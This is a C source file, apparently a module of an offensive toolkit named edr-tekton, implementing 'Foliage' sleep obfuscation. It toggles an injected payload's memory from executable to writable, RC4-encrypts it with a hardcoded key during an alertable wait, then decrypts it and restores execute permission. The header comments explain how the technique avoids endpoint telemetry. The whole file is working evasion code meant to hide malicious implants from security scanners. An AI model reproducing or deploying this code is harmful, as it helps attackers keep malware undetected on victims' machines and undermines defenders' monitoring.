/*
 * edr-tekton :: Foliage Sleep Obfuscation Module
 * Cat 50: APC-based sleep with memory permission cycling
 *
 * Foliage (@0xBoku) uses NtQueueApcThread to queue multiple APC
 * routines on the current thread, then triggers them via an
 * alertable wait (NtSignalAndWaitForSingleObject or SleepEx).
 *
 * The APC chain:
 *   1. NtProtectVirtualMemory(region, RW)
 *   2. SystemFunction032(encrypt)
 *   3. NtWaitForSingleObject(event, timeout)  [alertable]
 *   4. SystemFunction032(decrypt)
 *   5. NtProtectVirtualMemory(region, RX)
 *
 * Unlike Ekko (timer-based), Foliage uses APCs which execute in the
 * context of the current thread when it enters an alertable wait
 * state. This avoids creating timer queue objects.
 *
 * The APC approach has different telemetry visibility:
 *   - No CreateTimerQueueTimer (avoids timer-based detection)
 *   - APC dispatch is thread-local (no cross-thread signaling)
 *   - NtQueueApcThread to self is less suspicious than to remote
 *
 * The encrypt-sleep-decrypt cycle uses NtContinue (via the APC
 * NormalRoutine) to chain execution between steps, keeping the
 * call stack clean between operations.
 *
 * Pipeline stage: TEKTON_STAGE_SLEEP_INIT
 */

#include "tekton/modules/sleep.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── SystemFunction032 types (shared with ekko) ────────── */

typedef struct _USTRING {
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;
} USTRING;

/* ── Internal state ─────────────────────────────────────── */

typedef struct _FOLIAGE_STATE {
    TEKTON_SLEEP_CFG    cfg;
    PVOID               image_base;
    SIZE_T              image_size;
} FOLIAGE_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS foliage_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    FOLIAGE_STATE* state = (FOLIAGE_STATE*)malloc(sizeof(FOLIAGE_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    state->cfg.interval_ms = 5000;
    state->cfg.encrypt_on_sleep = TRUE;
    state->cfg.cycle_permissions = TRUE;
    state->cfg.spoof_thread_stack = FALSE;

    BYTE default_key[] = { 0x46, 0x4F, 0x4C, 0x49, 0x41, 0x47,
                           0x45, 0x4B, 0x45, 0x59, 0x21, 0x21 };
    memcpy(state->cfg.sleep_encrypt_key, default_key, sizeof(default_key));
    state->cfg.sleep_encrypt_key_len = sizeof(default_key);

    self->private_data = state;

    TLOG_DEBUG("sleep_foliage: init (interval=%lu ms, encrypt=%d)",
        (unsigned long)state->cfg.interval_ms,
        state->cfg.encrypt_on_sleep);
    return TEKTON_OK;
}

static TEKTON_STATUS foliage_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    FOLIAGE_STATE* state = (FOLIAGE_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("sleep_foliage: [DRY RUN] would APC sleep %lu ms (encrypt=%d)",
            (unsigned long)state->cfg.interval_ms,
            state->cfg.encrypt_on_sleep);
        return TEKTON_OK;
    }

#ifdef _WIN32
    PVOID encrypt_base = ctx->remote_base;
    SIZE_T encrypt_size = ctx->payload.length;

    if (!encrypt_base || encrypt_size == 0) {
        TLOG_WARN("sleep_foliage: no payload region, falling back to simple sleep");
        Sleep(state->cfg.interval_ms);
        return TEKTON_OK;
    }

    state->image_base = encrypt_base;
    state->image_size = encrypt_size;

    /* Resolve Nt* APIs for APC-based approach */
    BOOL use_nt = ctx->resolved.ssns_resolved;

    typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(
        HANDLE, PVOID, PVOID, PVOID, PVOID);
    typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
        HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD);
    typedef NTSTATUS (NTAPI *pfnNtWaitForSingleObject)(
        HANDLE, BOOL, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *pfnSysFn032)(USTRING*, USTRING*);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
    if (!hAdvapi) hAdvapi = LoadLibraryA("advapi32.dll");

    pfnNtProtectVirtualMemory pNtProt = NULL;
    pfnNtWaitForSingleObject pNtWait = NULL;
    pfnSysFn032 pSysFn032 = NULL;

    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pNtProt = (pfnNtProtectVirtualMemory)
            ctx->resolved.fn_nt_protect_virtual_memory;
    } else {
        pNtProt = (pfnNtProtectVirtualMemory)
            GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    }

    if (use_nt && ctx->resolved.fn_nt_wait_for_single_object) {
        pNtWait = (pfnNtWaitForSingleObject)
            ctx->resolved.fn_nt_wait_for_single_object;
    } else {
        pNtWait = (pfnNtWaitForSingleObject)
            GetProcAddress(hNtdll, "NtWaitForSingleObject");
    }

    if (hAdvapi) {
        pSysFn032 = (pfnSysFn032)GetProcAddress(hAdvapi, "SystemFunction032");
    }

    if (!pNtProt || !pSysFn032) {
        TLOG_WARN("sleep_foliage: missing APIs, falling back to simple sleep");
        Sleep(state->cfg.interval_ms);
        return TEKTON_OK;
    }

    /*
     * APC-based sleep cycle.
     *
     * In a full Foliage implementation, NtQueueApcThread queues
     * each step as a separate APC NormalRoutine on the current
     * thread. The APCs fire in FIFO order when the thread enters
     * an alertable wait state (SleepEx, WaitForSingleObjectEx,
     * or NtTestAlert).
     *
     * Simplified inline execution: call the same sequence
     * directly, using Nt* resolved APIs to keep the call stack
     * profile similar to what the APC chain would produce.
     */

    /* Prepare RC4 structs */
    USTRING data_str, key_str;
    data_str.Buffer = encrypt_base;
    data_str.Length = (DWORD)encrypt_size;
    data_str.MaximumLength = (DWORD)encrypt_size;

    key_str.Buffer = state->cfg.sleep_encrypt_key;
    key_str.Length = (DWORD)state->cfg.sleep_encrypt_key_len;
    key_str.MaximumLength = (DWORD)state->cfg.sleep_encrypt_key_len;

    /* Step 1: RX -> RW via NtProtectVirtualMemory */
    DWORD old_prot = 0;
    if (state->cfg.cycle_permissions) {
        PVOID prot_base = encrypt_base;
        SIZE_T prot_size = encrypt_size;
        pNtProt((HANDLE)-1, &prot_base, &prot_size, PAGE_READWRITE, &old_prot);
        TLOG_DEBUG("sleep_foliage: NtProtect -> RW");
    }

    /* Step 2: Encrypt via SystemFunction032 */
    if (state->cfg.encrypt_on_sleep) {
        pSysFn032(&data_str, &key_str);
        TLOG_DEBUG("sleep_foliage: encrypted %lu bytes", (unsigned long)encrypt_size);
    }

    /* Step 3: Sleep via NtWaitForSingleObject or alertable SleepEx */
    TLOG_DEBUG("sleep_foliage: sleeping %lu ms", (unsigned long)state->cfg.interval_ms);

    if (pNtWait) {
        /* Create an event to wait on (will timeout = our sleep) */
        typedef HANDLE (WINAPI *pfnCreateEventA)(PVOID, BOOL, BOOL, LPCSTR);
        pfnCreateEventA pCE = (pfnCreateEventA)
            GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateEventA");

        if (pCE) {
            HANDLE hEvt = pCE(NULL, TRUE, FALSE, NULL);
            if (hEvt) {
                LARGE_INTEGER timeout;
                timeout.QuadPart = -((long long)state->cfg.interval_ms * 10000LL);
                pNtWait(hEvt, TRUE /* alertable */, &timeout);
                CloseHandle(hEvt);
            }
        }
    } else {
        /* Fallback: alertable SleepEx */
        typedef DWORD (WINAPI *pfnSleepEx)(DWORD, BOOL);
        pfnSleepEx pSleepEx = (pfnSleepEx)
            GetProcAddress(GetModuleHandleA("kernel32.dll"), "SleepEx");
        if (pSleepEx) {
            pSleepEx(state->cfg.interval_ms, TRUE);
        } else {
            Sleep(state->cfg.interval_ms);
        }
    }

    /* Step 4: Decrypt via SystemFunction032 */
    if (state->cfg.encrypt_on_sleep) {
        pSysFn032(&data_str, &key_str);
        TLOG_DEBUG("sleep_foliage: decrypted %lu bytes", (unsigned long)encrypt_size);
    }

    /* Step 5: RW -> RX via NtProtectVirtualMemory */
    if (state->cfg.cycle_permissions) {
        PVOID prot_base = encrypt_base;
        SIZE_T prot_size = encrypt_size;
        pNtProt((HANDLE)-1, &prot_base, &prot_size, PAGE_EXECUTE_READ, &old_prot);
        TLOG_DEBUG("sleep_foliage: NtProtect -> RX");
    }

    TLOG_INFO("sleep_foliage: APC sleep cycle complete (%lu ms)",
        (unsigned long)state->cfg.interval_ms);
    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("sleep_foliage: [STUB] would APC sleep %lu ms",
        (unsigned long)state->cfg.interval_ms);
    return TEKTON_OK;
#endif
}

static VOID foliage_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(FOLIAGE_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD foliage_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: APC dispatch to self-thread is a common pattern.
     * NtProtectVirtualMemory and SystemFunction032 are legitimate
     * calls. The alertable wait via NtWaitForSingleObject is
     * standard. No cross-process operations, no suspicious
     * thread creation.
     */
    return 10;
}

static BOOL foliage_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition ─────────────────────────────────── */

TEKTON_MODULE tekton_mod_sleep_foliage = {
    .name           = "sleep_foliage",
    .description    = "Foliage: APC-based sleep with RC4 encryption (Cat 50)",
    .category       = TEKTON_CAT_SLEEP,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = TEKTON_MOD_STEALTHY,
    .skill_ref      = "50",
    .init           = foliage_init,
    .execute        = foliage_execute,
    .cleanup        = foliage_cleanup,
    .get_risk_score = foliage_risk_score,
    .check_compat   = foliage_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_sleep_foliage);
